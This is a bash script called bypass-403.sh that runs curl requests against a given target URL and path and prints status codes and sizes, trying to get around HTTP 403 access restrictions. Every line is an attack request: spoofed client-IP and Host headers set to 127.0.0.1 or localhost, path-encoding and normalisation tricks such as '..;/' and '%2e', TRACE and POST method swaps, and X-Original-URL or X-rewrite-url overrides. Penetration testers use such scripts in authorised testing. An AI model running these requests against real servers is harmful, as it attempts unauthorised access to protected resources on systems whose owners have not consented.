#! /bin/bash
echo "./bypass-403.sh https://target path"
echo " "
echo " "

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo " - ${1}/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: google.com" $1/$2
echo " - ${1}/${2} -H Host: google.com"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-Originating-IP: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: localhost" $1/$2
echo " - ${1}/${2} -H Host: localhost"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-ProxyUser-Ip: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Cluster-Client-IP: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H Cluster-Client-IP: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "True-Client-IP: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H True-Client-IP: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H Client-IP: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-Original-URL: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-ProxyUser-Ip: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-Remote-Addr: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-Remote-IP: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Forwarded-For: 127.0.0.1:80" $1/$2
echo " - ${1}/${2} -H Forwarded-For: 127.0.0.1:80"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Forwarded-For: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H Forwarded-For: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-Forwarded: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1" $1/$2
echo " - ${1}/${2} -H X-Forwarded-For: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo " - ${1}/%2e/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%252e**/$2
echo " - ${1}/%252e**/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%ef%bc%8f$2
echo " - ${1}/%ef%bc%8f${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/
echo " - ${1}/${2}/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo " - ${1}/${2}/."

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo " - ${1}//${2}//"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/..
echo " - ${1}/./${2}/.."

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/..;/"
echo " - ${1}/${2}/..;/"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/;/$2"
echo " - ${1}/;/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/.;/$2"
echo " - ${1}/.;/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1//;//$2"
echo " - ${1}//;//${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2f/$2
echo " - ${1}/%2f/${2}"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo " - ${1}/${2}.json"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#randomtext
echo " - ${1}/${2}#randomtext"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo " - ${1}/${2} -X TRACE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo " - ${1}/${2} -H Content-Length:0 -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: /$2" $1
echo " - ${1} -H X-rewrite-url: /$2"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X­-Original-­URL: /$2" $1
echo " - ${1} -H X-Original-URL: /$2"
